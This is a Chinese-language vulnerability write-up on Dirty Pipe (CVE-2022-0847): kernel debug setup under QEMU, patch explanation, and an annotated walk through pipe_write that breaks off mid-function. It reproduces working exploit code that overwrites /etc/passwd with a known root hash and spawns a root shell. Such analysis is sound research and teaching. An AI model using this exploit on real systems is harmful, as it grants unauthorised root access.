<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h2 data-content="1" id="48f818b22bb87a6d676ee45191f6e591">从脏管道(CVE-2022-0847)到docker逃逸</h2>
<p>本文主要分析了CVE-2022-0847的原理和由于其独特的利用条件造成的关于docker逃逸的利用思路</p>
<h3 data-content="1" id="2827f99d208752ba530d97130e4087cd">漏洞环境</h3>
<h4 data-content="1" id="637e027251f8aa625fd2776742f7e8b6">内核源码</h4>
<pre><code>wget https://cdn.kernel.org/pub/linux/kernel/v5.x/linux-5.11.1.tar.gz</code></pre>
<h4 data-content="1" id="f747f9debda78df82cfd3842271975e1">编译</h4>
<pre><code>make x86_64_defconfig   # 加载默认config
make menuconfig         # 自定义config</code></pre>
<h5 data-content="1" id="c016ee0a4fce8664f20383fbb9244987">编译选项</h5>
<p>添加调试信息， 需要以下几行</p>
<pre><code>[*] Compile the kernel with debug info                                                               
   [*]   Generate dwarf4 debuginfo                                         
   [*]   Provide GDB scripts for kernel debugging</code></pre>
<h4 data-content="1" id="f48106ede8fd2799fc5d2e4181ca40a8">文件系统</h4>
<pre><code>sudo mkfs.ext4 -F stretch.img</code></pre>
<h4 data-content="1" id="fd612f6ae00add76fd1b07f8d1e3798c">共享文件夹与命令</h4>
<p>上文制作的文件系统只有最基本的命令，在主机上下载静态编译的busybox和poc放到share目录下，方便在虚拟机中使用</p>
<p>在下文qemu的启动命令的<code>-hdb fat:rw:/home/happi0/note/CVE-2022-0847/linux-5.11.1/share</code>是将主机的share目录挂载到虚拟机上，我这里的环境是在虚拟机的<code>/dev/sdb1</code>上，进入虚拟机后使用使用<code>mount</code>命令将share文件夹挂载即可</p>
<pre><code>host:
    mkdir share
    wget  bin.n0p.me/x64/busybox
    mv busybox share

vir:
    mkdir /share
    mount /dev/sdb1 /share</code></pre>
<p>由于本虚拟机是只有很基本的环境，在调试漏洞之前还需要做一些操作, 创建<code>/etc/passwd</code>, <code>修改权限</code>等</p>
<div class="highlight"><pre><span></span>cat /share/passwd &gt; /etc/passwd<span class="o">()</span>
chmod <span class="m">777</span> /tmp
touch /tmp/passwd.bak
chmod <span class="m">777</span> /tmp/passwd.bak
</pre></div>
<h4 data-content="1" id="3389854d9171c9cdc774a41516922e8a">qemu</h4>
<p>启动虚拟机</p>
<p>一个小坑, 由于我的主机是<code>arch</code>, <code>qemu</code>的依赖被破坏了，需要手动安装低版本<code>libbpf</code>, 用<code>pacman -Udd</code>强制安装即可</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230119153745-2a4ec1ae-97cc-1.png"/></p>
<div class="highlight"><pre><span></span>sudo qemu-system-x86_64 <span class="se">\</span>
    -s <span class="se">\</span>
    -m 2G <span class="se">\</span>
    -smp <span class="m">2</span> <span class="se">\</span>
    -kernel ./arch/x86/boot/bzImage <span class="se">\</span>
    -append <span class="s2">"console=ttyS0 earlyprintk=serial"</span><span class="se">\</span>
    -hda ./stretch.img <span class="se">\</span>
    -hdb fat:rw:/home/happi0/note/CVE-2022-0847/linux-5.11.1/share <span class="se">\</span>
    -nographic <span class="se">\</span>
    -initrd initramfs.img <span class="se">\</span>
    -pidfile vm.pid <span class="se">\</span>
    <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> tee vm.log
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230119153807-376ccad4-97cc-1.png"/></p>
<h3 data-content="1" id="297e1e735217236c076a7be64722f609">漏洞原理</h3>
<p>在调试之前首先根据补丁来简单了解一下漏洞造成的原因。</p>
<p><a href="https://github.com/torvalds/linux/commit/9d2231c5d74e13b2a0546fee6737ee4446017903" target="_blank">补丁</a>中给<code>copy_page_to_iter_pipe()</code>和<code>push_pipe()</code>添加了<code>buf-&gt;flags</code>的初始化为0。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230119153825-41e20b46-97cc-1.png"/></p>
<p>这里需要了解一些前置知识，有三篇写的很详细的文章</p>
<ul>
<li><a href="https://fa1lr4in.com/2022/03/30/CVE-2022-0847-dirtypipe-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%85%A8%E7%BD%91%E7%AC%AC%E4%BA%8C%E8%AF%A6%E7%BB%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" target="_blank">CVE-2022-0847 dirtypipe linux本地提权全网第二详细漏洞分析</a></li>
<li><a href="https://www.anquanke.com/post/id/269886#h3-2" target="_blank">Linux 内核 DirtyPipe 任意只读文件覆写漏洞（CVE-2022-0847）分析</a></li>
<li><a href="https://paper.seebug.org/1843/" target="_blank">Linux 内核提权 DirtyPipe(CVE-2022-0847) 漏洞分析</a></li>
</ul>
<p>不过由于本文重点不在这里，这里只简单说一下我自己的理解。</p>
<ul>
<li>
<p>管道(<code>pipe</code>)是linux中进程中通信的主要手段，它被设计为一个可以循环使用的环形数据结构，通常只有16个<code>page</code>(每个<code>page</code>大小通常为4k)，为了节省空间，如果单次没有写满一个<code>page</code>大小，<code>pipe buffer</code>会有一个<code>PIPE_BUF_FLAG_CAN_MERGE</code>属性(其值为0x10)，用来标识该页面没有写满。当该属性存在时，下次<code>pipe_write()</code>会继续向同一个<code>page</code>写入数据。</p>
</li>
<li>
<p><code>splice()</code>将包含文件的<code>page</code>链接到<code>pipe</code>时<code>copy_page_to_iter_pipe()</code>和<code>push_pipe()</code>函数没有对<code>buf-&gt;flag</code>初始化，也就是说，如果该<code>page</code>的<code>PIPE_BUF_FLAG_CAN_MERGE</code>属性为真的话，会继续向该<code>page</code>写入内容，造成非法写入。</p>
</li>
</ul>
<h4 data-content="1" id="8bef24b3b1ec5930a14ef222424dfc8f">Exp分析</h4>
<p>根据<a href="https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/blob/main/exploit.c" target="_blank">exp</a>分析漏洞利用的细节，删除了部分检测利用条件、备份密码等漏洞利用不相关代码。</p>
<div class="highlight"><pre><span></span><span class="k">static</span> <span class="kt">void</span> <span class="nf">prepare_pipe</span><span class="p">(</span><span class="kt">int</span> <span class="n">p</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
<span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">pipe</span><span class="p">(</span><span class="n">p</span><span class="p">))</span> <span class="n">abort</span><span class="p">();</span>

    <span class="k">const</span> <span class="kt">unsigned</span> <span class="n">pipe_size</span> <span class="o">=</span> <span class="n">fcntl</span><span class="p">(</span><span class="n">p</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">F_GETPIPE_SZ</span><span class="p">);</span>
    <span class="k">static</span> <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">4096</span><span class="p">];</span>

    <span class="k">for</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="n">r</span> <span class="o">=</span> <span class="n">pipe_size</span><span class="p">;</span> <span class="n">r</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">;)</span> <span class="p">{</span>
        <span class="kt">unsigned</span> <span class="n">n</span> <span class="o">=</span> <span class="n">r</span> <span class="o">&gt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">)</span> <span class="o">?</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">)</span> <span class="o">:</span> <span class="n">r</span><span class="p">;</span>
        <span class="n">write</span><span class="p">(</span><span class="n">p</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">n</span><span class="p">);</span>
        <span class="n">r</span> <span class="o">-=</span> <span class="n">n</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="c1">// 将所有管道填满，使其具有PIPE_BUF_FLAG_CAN_MERGE属性</span>

    <span class="k">for</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="n">r</span> <span class="o">=</span> <span class="n">pipe_size</span><span class="p">;</span> <span class="n">r</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">;)</span> <span class="p">{</span>
        <span class="kt">unsigned</span> <span class="n">n</span> <span class="o">=</span> <span class="n">r</span> <span class="o">&gt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">)</span> <span class="o">?</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">)</span> <span class="o">:</span> <span class="n">r</span><span class="p">;</span>
        <span class="n">read</span><span class="p">(</span><span class="n">p</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">n</span><span class="p">);</span>
        <span class="n">r</span> <span class="o">-=</span> <span class="n">n</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="c1">// 读取所有管道的内容，即清空管道</span>

<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="n">path</span> <span class="o">=</span> <span class="s">"/etc/passwd"</span><span class="p">;</span>

    <span class="p">...</span>
    <span class="c1">// 备份/etc/passwd</span>
    <span class="p">...</span>
    <span class="n">loff_t</span> <span class="n">offset</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span> 
    <span class="c1">// 略过"root"字符，这样构造也是因为漏洞利用的条件包含必须有大于1的偏移</span>
    <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="n">data</span> <span class="o">=</span> <span class="s">":$1$aaron$pIwpJwMMcozsUxAtRa85w.:0:0:test:/root:/bin/sh</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span> 
    <span class="c1">// openssl passwd -1 -salt aaron aaron 密码的哈希散列</span>

    <span class="k">const</span> <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"open failed"</span><span class="p">);</span>
        <span class="k">return</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="c1">// 以只读权限打开特权文件</span>

    <span class="p">...</span>
    <span class="c1">// 一些漏洞利用条件检查</span>

    <span class="kt">int</span> <span class="n">p</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
    <span class="n">prepare_pipe</span><span class="p">(</span><span class="n">p</span><span class="p">);</span>
    <span class="c1">// 使得创建的管道具有PIPE_BUF_FLAG_CAN_MERGE属性，为漏洞利用做准备</span>

    <span class="o">--</span><span class="n">offset</span><span class="p">;</span>
    <span class="kt">ssize_t</span> <span class="n">nbytes</span> <span class="o">=</span> <span class="n">splice</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">offset</span><span class="p">,</span> <span class="n">p</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="c1">// 将file page和pipe buf关联起来</span>
    <span class="c1">// 由于PIPE_BUF_FLAG_CAN_MERGE属性的存在，不会创建新的pipe_buffer, 数据会直接写进file page中</span>

    <span class="n">nbytes</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="n">p</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">data</span><span class="p">,</span> <span class="n">data_size</span><span class="p">);</span>
    <span class="c1">// 写入数据</span>

    <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="s">"-c"</span><span class="p">,</span> <span class="s">"(echo aaron; cat) | su - -c </span><span class="se">\"</span><span class="s">"</span>
                <span class="s">"echo </span><span class="se">\\\"</span><span class="s">Restoring /etc/passwd from /tmp/passwd.bak...</span><span class="se">\\\"</span><span class="s">;"</span>
                <span class="s">"cp /tmp/passwd.bak /etc/passwd;"</span>
                <span class="s">"echo </span><span class="se">\\\"</span><span class="s">Done! Popping shell... (run commands now)</span><span class="se">\\\"</span><span class="s">;"</span>
                <span class="s">"/bin/sh;"</span>
            <span class="s">"</span><span class="se">\"</span><span class="s"> root"</span><span class="p">};</span>
        <span class="n">execv</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="n">argv</span><span class="p">);</span>

        <span class="n">printf</span><span class="p">(</span><span class="s">"system() function call seems to have failed :(</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">EXIT_SUCCESS</span><span class="p">;</span>
    <span class="c1">// 弹出shell</span>
<span class="p">}</span>
</pre></div>
<p>从上面可以看出EXP主要可以分为四步</p>
<ul>
<li>备份密码</li>
<li>使管道具有<code>PIPE_BUF_FLAG_CAN_MERGE</code>具有属性，EXP中使用的是填满再清空的方法</li>
<li>用splice将file page和pipe 关联起来</li>
<li>将数据写入管道</li>
</ul>
<h4 data-content="1" id="f6c76735894a81a4b64bee8eaeb416f3">动态跟踪</h4>
<h5 data-content="1" id="af33a491225e491aa90a8640b9f659ba">使管道具有<code>PIPE_BUF_FLAG_CAN_MERGE</code>具有属性</h5>
<p>使管道具有<code>PIPE_BUF_FLAG_CAN_MERGE</code>具有属性的关键点在<a href="https://elixir.bootlin.com/linux/v5.11.1/source/fs/pipe.c#L401" target="_blank">pipe_write函数中</a>，已略去部分无关代码</p>
<div class="highlight"><pre><span></span><span class="n">pipe_write</span><span class="p">(</span><span class="k">struct</span> <span class="n">kiocb</span> <span class="o">*</span><span class="n">iocb</span><span class="p">,</span> <span class="k">struct</span> <span class="n">iov_iter</span> <span class="o">*</span><span class="n">from</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">filp</span> <span class="o">=</span> <span class="n">iocb</span><span class="o">-&gt;</span><span class="n">ki_filp</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">pipe_inode_info</span> <span class="o">*</span><span class="n">pipe</span> <span class="o">=</span> <span class="n">filp</span><span class="o">-&gt;</span><span class="n">private_data</span><span class="p">;</span>          
    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">head</span><span class="p">;</span>
    <span class="kt">ssize_t</span> <span class="n">ret</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">size_t</span> <span class="n">total_len</span> <span class="o">=</span> <span class="n">iov_iter_count</span><span class="p">(</span><span class="n">from</span><span class="p">);</span>
    <span class="kt">ssize_t</span> <span class="n">chars</span><span class="p">;</span>
    <span class="kt">bool</span> <span class="n">was_empty</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
    <span class="kt">bool</span> <span class="n">wake_next_writer</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>

    <span class="p">...</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">readers</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">// 没有读端直接返回</span>
        <span class="n">send_sig</span><span class="p">(</span><span class="n">SIGPIPE</span><span class="p">,</span> <span class="n">current</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
        <span class="n">ret</span> <span class="o">=</span> <span class="o">-</span><span class="n">EPIPE</span><span class="p">;</span>
        <span class="k">goto</span> <span class="n">out</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="p">...</span>

    <span class="n">head</span> <span class="o">=</span> <span class="n">pipe</span><span class="o">-&gt;</span><span class="n">head</span><span class="p">;</span>                                                                              
    <span class="n">was_empty</span> <span class="o">=</span> <span class="n">pipe_empty</span><span class="p">(</span><span class="n">head</span><span class="p">,</span> <span class="n">pipe</span><span class="o">-&gt;</span><span class="n">tail</span><span class="p">);</span>
    <span class="c1">// 判断管道头尾指针是否相等，如果相等则管道为空。</span>
    <span class="n">chars</span> <span class="o">=</span> <span class="n">total_len</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">PAGE_SIZE</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
    <span class="c1">// 判断需要写入的数据的大小，chars为余数</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">chars</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">was_empty</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">// 页帧不为空且chars不为空，则从最后一页接着写</span>
        <span class="c1">// 在exp前部分中，每次向pipe中写入的数据大小为页帧的整数倍，所以chars总为空</span>
        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">mask</span> <span class="o">=</span> <span class="n">pipe</span><span class="o">-&gt;</span><span class="n">ring_size</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>                        
        <span class="k">struct</span> <span class="n">pipe_buffer</span> <span class="o">*</span><span class="n">buf</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">bufs</span><span class="p">[(</span><span class="n">head</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">mask</span><span class="p">];</span>       
        <span class="kt">int</span> <span class="n">offset</span> <span class="o">=</span> <span class="n">buf</span><span class="o">-&gt;</span><span class="n">offset</span> <span class="o">+</span> <span class="n">buf</span><span class="o">-&gt;</span><span class="n">len</span><span class="p">;</span>                            

        <span class="k">if</span> <span class="p">((</span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">PIPE_BUF_FLAG_CAN_MERGE</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
            <span class="n">offset</span> <span class="o">+</span> <span class="n">chars</span> <span class="o">&lt;=</span> <span class="n">PAGE_SIZE</span><span class="p">)</span> <span class="p">{</span>
            <span class="c1">// 如果buf -&gt; flag == PIPE_BUF_FLAG_CAN_MERGE, 即代表当前页是可融合的</span>
            <span class="c1">// 且已有内容 + 剩余内容 &lt; 页帧大小，则直接将剩余内容写入当前页</span>
            <span class="n">ret</span> <span class="o">=</span> <span class="n">pipe_buf_confirm</span><span class="p">(</span><span class="n">pipe</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">ret</span><span class="p">)</span>
                <span class="k">goto</span> <span class="n">out</span><span class="p">;</span>

            <span class="n">ret</span> <span class="o">=</span> <span class="n">copy_page_from_iter</span><span class="p">(</span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">page</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">chars</span><span class="p">,</span> <span class="n">from</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">unlikely</span><span class="p">(</span><span class="n">ret</span> <span class="o">&lt;</span> <span class="n">chars</span><span class="p">))</span> <span class="p">{</span>
                <span class="n">ret</span> <span class="o">=</span> <span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span>
                <span class="k">goto</span> <span class="n">out</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="n">buf</span><span class="o">-&gt;</span><span class="n">len</span> <span class="o">+=</span> <span class="n">ret</span><span class="p">;</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">iov_iter_count</span><span class="p">(</span><span class="n">from</span><span class="p">))</span>
                <span class="k">goto</span> <span class="n">out</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">for</span> <span class="p">(;;)</span> <span class="p">{</span>
   <span class="c1">// 这里是最后一页无法接着写的情况</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">readers</span><span class="p">)</span> <span class="p">{</span>                                       
        <span class="c1">// 如果pipe的读者数量为0，则发送信号，直到有读者。</span>
            <span class="n">send_sig</span><span class="p">(</span><span class="n">SIGPIPE</span><span class="p">,</span> <span class="n">current</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">ret</span><span class="p">)</span>
                <span class="n">ret</span> <span class="o">=</span> <span class="o">-</span><span class="n">EPIPE</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="n">head</span> <span class="o">=</span> <span class="n">pipe</span><span class="o">-&gt;</span><span class="n">head</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">pipe_full</span><span class="p">(</span><span class="n">head</span><span class="p">,</span> <span class="n">pipe</span><span class="o">-&gt;</span><span class="n">tail</span><span class="p">,</span> <span class="n">pipe</span><span class="o">-&gt;</span><span class="n">max_usage</span><span class="p">))</span> <span class="p">{</span>            
            <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">mask</span> <span class="o">=</span> <span class="n">pipe</span><span class="o">-&gt;</span><span class="n">ring_size</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>                    
            <span class="k">struct</span> <span class="n">pipe_buffer</span> <span class="o">*</span><span class="n">buf</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">bufs</span><span class="p">[</span><span class="n">head</span> <span class="o">&amp;</span> <span class="n">mask</span><span class="p">];</span>         
            <span class="k">struct</span> <span class="n">page</span> <span class="o">*</span><span class="n">page</span> <span class="o">=</span> <span class="n">pipe</span><span class="o">-&gt;</span><span class="n">tmp_page</span><span class="p">;</span>                         
            <span class="kt">int</span> <span class="n">copied</span><span class="p">;</span>         

            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">page</span><span class="p">)</span> <span class="p">{</span>                                                                        
            <span class="c1">// 如果缓存页为空，则新分配的page</span>
                <span class="n">page</span> <span class="o">=</span> <span class="n">alloc_page</span><span class="p">(</span><span class="n">GFP_HIGHUSER</span> <span class="o">|</span> <span class="n">__GFP_ACCOUNT</span><span class="p">);</span>        
                <span class="k">if</span> <span class="p">(</span><span class="n">unlikely</span><span class="p">(</span><span class="o">!</span><span class="n">page</span><span class="p">))</span> <span class="p">{</span>
                    <span class="n">ret</span> <span class="o">=</span> <span class="n">ret</span> <span class="o">?</span> <span class="o">:</span> <span class="o">-</span><span class="n">ENOMEM</span><span class="p">;</span>
                    <span class="k">break</span><span class="p">;</span>
                <span class="p">}</span>
                <span class="n">pipe</span><span class="o">-&gt;</span><span class="n">tmp_page</span> <span class="o">=</span> <span class="n">page</span><span class="p">;</span>          
            <span class="p">}</span>


            <span class="n">spin_lock_irq</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">rd_wait</span><span class="p">.</span><span class="n">lock</span><span class="p">);</span>                     
            <span class="n">head</span> <span class="o">=</span> <span class="n">pipe</span><span class="o">-&gt;</span><span class="n">head</span><span class="p">;</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">pipe_full</span><span class="p">(</span><span class="n">head</span><span class="p">,</span> <span class="n">pipe</span><span class="o">-&gt;</span><span class="n">tail</span><span class="p">,</span> <span class="n">pipe</span><span class="o">-&gt;</span><span class="n">max_usage</span><span class="p">))</span> <span class="p">{</span>
                <span class="n">spin_unlock_irq</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">rd_wait</span><span class="p">.</span><span class="n">lock</span><span class="p">);</span>
                <span class="k">continue</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="n">pipe</span><span class="o">-&gt;</span><span class="n">head</span> <span class="o">=</span> <span class="n">head</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
            <span class="n">spin_unlock_irq</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">rd_wait</span><span class="p">.</span><span class="n">lock</span><span class="p">);</span>

            <span class="n">buf</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">bu</span> <span class="n">fs</span><span class="p">[</span><span class="n">head</span> <span class="o">&amp;</span> <span class="n">mask</span><span class="p">];</span>            
            <span class="n">buf</span><span class="o">-&gt;</span><span class="n">page</span> <span class="o">=</span> <span class="n">page</span><span class="p">;</span>
            <span class="c1">// 把新申请的页放入页数组中</span>
            <span class="n">buf</span><span class="o">-&gt;</span><span class="n">ops</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">anon_pipe_buf_ops</span><span class="p">;</span>
            <span class="n">buf</span><span class="o">-&gt;</span><span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
            <span class="n">buf</span><span class="o">-&gt;</span><span class="n">len</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">is_packetized</span><span class="p">(</span><span class="n">filp</span><span class="p">))</span>                            
                <span class="n">buf</span><span class="o">-&gt;</span><span class="n">flags</span> <span class="o">=</span> <span class="n">PIPE_BUF_FLAG_PACKET</span><span class="p">;</span>      
            <span class="k">else</span>
                <span class="n">buf</span><span class="o">-&gt;</span><span class="n">flags</span> <span class="o">=</span> <span class="n">PIPE_BUF_FLAG_CAN_MERGE</span><span class="p">;</span>
                <span class="c1">// 设置flag, 默认为PIPE_BUF_FLAG_CAN_MERGE， 即可融合的页</span>
                <span class="c1">// #define PIPE_BUF_FLAG_CAN_MERGE  0x10</span>
            <span class="n">pipe</span><span class="o">-&gt;</span><span class="n">tmp_page</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

            <span class="n">copied</span> <span class="o">=</span> <span class="n">copy_page_from_iter</span><span class="p">(</span><span class="n">page</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">PAGE_SIZE</span><span class="p">,</span> <span class="n">from</span><span class="p">);</span>     
            <span class="k">if</span> <span class="p">(</span><span class="n">unlikely</span><span class="p">(</span><span class="n">copied</span> <span class="o">&lt;</span> <span class="n">PAGE_SIZE</span> <span class="o">&amp;&amp;</span> <span class="n">iov_iter_count</span><span class="p">(</span><span class="n">from</span><span class="p">)))</span> <span class="p">{</span>
                <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">ret</span><span class="p">)</span>
                    <span class="n">ret</span> <span class="o">=</span> <span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="n">ret</span> <span class="o">+=</span> <span class="n">copied</span><span class="p">;</span>              
            <span class="n">buf</span><span class="o">-&gt;</span><span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
            <span class="n">buf</span><span class="o">-&gt;</span><span class="n">len</span> <span class="o">=</span> <span class="n">copied</span><span class="p">;</span>

            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">iov_iter_count</span><span class="p">(</span><span class="n">from</span><span class="p">))</span>
                <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="p">...</span>

        <span class="n">__pipe_unlock</span><span class="p">(</span><span class="n">pipe</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">was_empty</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">wake_up_interruptible_sync_poll</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">rd_wait</span><span class="p">,</span> <span class="n">EPOLLIN</span> <span class="o">|</span> <span class="n">EPOLLRDNORM</span><span class="p">);</span>
            <span class="n">kill_fasync</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">fasync_readers</span><span class="p">,</span> <span class="n">SIGIO</span><span class="p">,</span> <span class="n">POLL_IN</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="n">wait_event_interruptible_exclusive</span><span class="p">(</span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">wr_wait</span><span class="p">,</span> <span class="n">pipe_writable</span><span class="p">(</span><span class="n">pipe</span><span class="p">));</span>
        <span class="n">__pipe_lock</span><span class="p">(</span><span class="n">pipe</span><span class="p">);</span>
        <span class="n">was_empty</span> <span class="o">=</span> <span class="n">pipe_empty</span><span class="p">(</span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">head</span><span class="p">,</span> <span class="n">pipe</span><span class="o">-&gt;</span><span class="n">tail</span><span class="p">);</span>
        <span class="n">wake_next_writer</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
    <span class="p">}</span>
<span class="nl">out</span><span class="p">:</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">pipe_full</span><span class="p">(</span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">head</span><span class="p">,</span> <span class="n">pipe</span><span class="o">-&gt;</span><span class="n">tail</span><span class="p">,</span> <span class="n">pipe</span><span class="o">-&gt;</span><span class="n">max_usage</span><span class="p">))</span>
        <span class="n">wake_next_writer</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
    <span class="n">__pipe_unlock</span><span class="p">(</span><span class="n">pipe</span><span class="p">);</span>


    <span class="k">if</span> <span class="p">(</span><span class="n">was_empty</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">wake_up_interruptible_sync_poll</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">rd_wait</span><span class="p">,</span> <span class="n">EPOLLIN</span> <span class="o">|</span> <span class="n">EPOLLRDNORM</span><span class="p">);</span>
